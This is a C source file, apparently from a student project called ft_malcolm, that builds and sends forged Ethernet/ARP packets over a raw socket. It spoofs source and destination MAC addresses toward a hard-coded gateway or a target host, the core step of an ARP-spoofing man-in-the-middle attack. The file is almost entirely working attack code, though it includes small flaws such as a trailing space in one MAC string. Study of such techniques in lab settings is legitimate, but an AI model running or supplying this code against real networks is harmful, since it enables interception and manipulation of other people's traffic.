#include "ft_malcolm.h"

/*
Ethernet Header
  |- Destination MAC Address
  |- Source MAC Address
  |- EtherType (ARP: 0x0806)

ARP Header
  |- Hardware Type (Ethernet: 1)
  |- Protocol Type (IPv4: 0x0800)
  |- Hardware Address Length (MAC address length: 6)
  |- Protocol Address Length (IPv4 address length: 4)
  |- Operation (ARP Reply: 2)
  |- Sender MAC Address
  |- Sender IP Address
  |- Target MAC Address
  |- Target IP Address

Payload (if any)
*/

void    _mc_create_packet_for_spoofing(int mode)
{
    // Modify the Ethernet header
    uint8_t         *src_mac, *dest_mac;
    struct ethhdr   *eth = (struct ethhdr *)_mc_g_data.packet;
    /* Spoofing the ethernet header */

    uint8_t gateway_mac[6];
    _mc_convert_mac_string_to_bytes("cc:fd:17:a6:cc:44 ", gateway_mac);

    if (mode == _MC_PACKET_TO_GATEWAY)
    {
        src_mac = _mc_g_data.host_mac;
        dest_mac = gateway_mac;
    }
    else if (mode == _MC_PACKET_TO_TARGET)
    {
        src_mac = _mc_g_data.host_mac;
        dest_mac = _mc_g_data.target_mac;   
    }

    // Set the source MAC address
	_mc_memcpy(eth->h_source, src_mac, ETH_ALEN);
    // Set the destination MAC address
	_mc_memcpy(eth->h_dest, dest_mac, ETH_ALEN);

    // eth->h_proto = htons(ETH_P_CUST);

    printf("Ethernet header:\n");
    printf("h_dest: ");_mc_print_mac(eth->h_dest);
	printf("h_src: "); _mc_print_mac(eth->h_source);

    struct iphdr 	*ip = (struct iphdr *)(_mc_g_data.packet + sizeof(struct ethhdr));
    uint8_t			*sender_ip = (uint8_t *)&ip->saddr;
    uint8_t			*dest_ip = (uint8_t *)&ip->daddr;
    ip->ttl = 42; //TODO for testing: capture packets with `sudo tcpdump -i wlo1 -nn 'ip[8] = 42'`
    printf("ip_dest: ");_mc_print_ip(dest_ip);
	printf("ip_src: "); _mc_print_ip(sender_ip);
}

void	_mc_run_arp_spoofing(int mode)
{
	_mc_create_packet_for_spoofing(mode);

    uint8_t gateway_mac[6];
    _mc_convert_mac_string_to_bytes("cc:fd:17:a6:cc:44", gateway_mac);

    // Create raw socket for capturing every kind of packets,
	// and save the file descriptor
    int raw_sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (raw_sockfd == -1)
	{
        fprintf(stderr, _MC_RED_CROSS " Failed to create raw socket");
        close(raw_sockfd);
        return ;
    }

    struct sockaddr_ll    src_addr;
    // Initialize the source address structure
    memset(&src_addr, 0, sizeof(src_addr));
    src_addr.sll_family = AF_PACKET;
    src_addr.sll_ifindex = if_nametoindex("wlo1");
    // src_addr.sll_ifindex = if_nametoindex("wlx00c0ca97cc19");
    if (src_addr.sll_ifindex == 0)
    {
        perror("if_nametoindex failed");
        exit(EXIT_FAILURE);
    }
    src_addr.sll_halen = ETH_ALEN;

    if (mode == _MC_PACKET_TO_GATEWAY)
        memcpy(src_addr.sll_addr, gateway_mac, ETH_ALEN);
    else if (mode == _MC_PACKET_TO_TARGET)
        memcpy(src_addr.sll_addr, _mc_g_data.target_mac, ETH_ALEN);

    /* Send the fake ARP reply using the custom packet
        (Destination port is inside src_addr) */
    printf(_MC_YELLOW_COLOR
        ">> Now sending packet <<"
        _MC_RESET_COLOR "\n\n"
    );

    int ret = sendto(
        raw_sockfd, _mc_g_data.packet, _mc_g_data.packet_size, 0,
        (struct sockaddr *)&src_addr, sizeof(struct sockaddr_ll)
    );

    close(raw_sockfd);

    if (ret <= 0) {
        fprintf(stderr, _MC_RED_CROSS "Failed to send the packet.\n");
                // Optionally, you can also print the error number
        printf("Error number: %d\n", errno);
    } else
        printf("\nSuccessfully sent a packet to the destination.\n");
}